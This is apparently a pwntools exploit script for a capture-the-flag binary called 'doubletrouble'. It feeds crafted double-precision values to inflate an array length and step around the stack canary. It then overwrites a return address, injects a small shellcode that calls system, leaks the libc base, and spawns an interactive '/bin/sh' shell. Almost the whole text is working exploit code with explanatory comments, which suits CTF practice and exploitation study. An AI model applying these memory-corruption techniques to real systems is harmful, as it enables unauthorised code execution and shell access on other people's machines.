#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template doubletrouble
import struct
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('doubletrouble')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

def double_to_hex(d):
    return hex(struct.unpack('<Q', struct.pack('<d', d))[0])

def double_to_bytes(d):
    return struct.pack('<d', d)

def int_to_double(i):
    return struct.unpack('<d', i.to_bytes(8, "little"))[0]

def bytes_to_double(b):
    return struct.unpack('<d', b)[0]

def generate_double_payload(i):
    dval = int_to_double(i)
    return str(dval).encode()

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    p = process([exe.path] + argv, *a, **kw)

    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)

    return p

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b helpers
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments

io = start()

length = 64
leak = io.recvline().strip()
leak = int(leak, 0)
log.info(f"Got leak: {hex(leak)} / {int_to_double(leak)}")
io.recvuntil(b"long:")
io.sendline(str(length).encode())

# if (((double)CONCAT44(param_4,zero1) < array[*length - index]) && (array[*length - index] < (double)CONCAT44(param_6,zero2))) break
# findArray(&length, array, 0, 0xc0590000, 0, 0xc0240000)

# [ins] In [2]: struct.unpack("<d", int(0xc059000000000000).to_bytes(8, "little"))
# Out[2]: (-100.0,)

# [ins] In [3]: struct.unpack("<d", int(0xc024000000000000).to_bytes(8, "little"))
# Out[3]: (-10.0,)

# if (-100.0 < array[*length-index] && array[*length-index] < -10.0)

system = 0x0804bff0

values = []

# every value smaller than -100.0 will increment the length
# after incrementing length enough times I have to pass the value which is between -100.0 and -10.0 in order to execute break instruction
# next function which is executed is sortArray() and I need to create such array that will not move canary
# and will overwrite return address

increment_value = 0xffdd000000000000    # that increments length - there is almost 100% probablity this will be the smallest value
stop_value      = 0xc040000000000000    # stops the loop
offset          = 0x1e5000

shellcode = asm(
    "call [{}];".format(hex(system))
)
shellcode = int.from_bytes(shellcode, "little")
increment_value |= shellcode
log.info(f"The increment value is now: {hex(increment_value)}")

# 4 * increment value
# 60 * some value
# canary
# something
# return address

increment = 4
ret_addr = (leak) << 0x20

# increment the length value to become (64 + $increment)
for i in range(increment):
    io.recvuntil(b"Give me:")
    io.sendline(generate_double_payload(increment_value))

# stop incrementing by sending the value between -100.0 and -10.0
io.recvuntil(b"Give me:")
io.sendline(generate_double_payload(stop_value))

# flood the stack with desired return address (this will become return address of helper function)
for i in range(length - increment - 2):
    io.recvuntil(b"Give me:")
    io.sendline(generate_double_payload(ret_addr))

# override the return address
io.recvuntil(b"Give me:")
io.sendline(generate_double_payload(exe.sym.helpers << 0x20))

io.recvuntil(b"Sorted Array:")
io.recvline()
for _ in range(64 + increment):
    val = io.recvline().strip().split(b":")[1]
    val = double_to_hex(float(val))
    # this is the libc leak
    if val.startswith('0xf7'):
        log.info(f"Got leak: {val[:10]}")
        libc.address = int(val[:10], 0) - offset

log.success(f"Got libc: {hex(libc.address)}")
binsh = next(libc.search(b"/bin/sh"))

# put address of /bin/sh on the stack
try:
    io.sendline(p32(binsh))
except:
    log.warning("Sorting failed, please try again...")
    exit(0)

io.interactive()

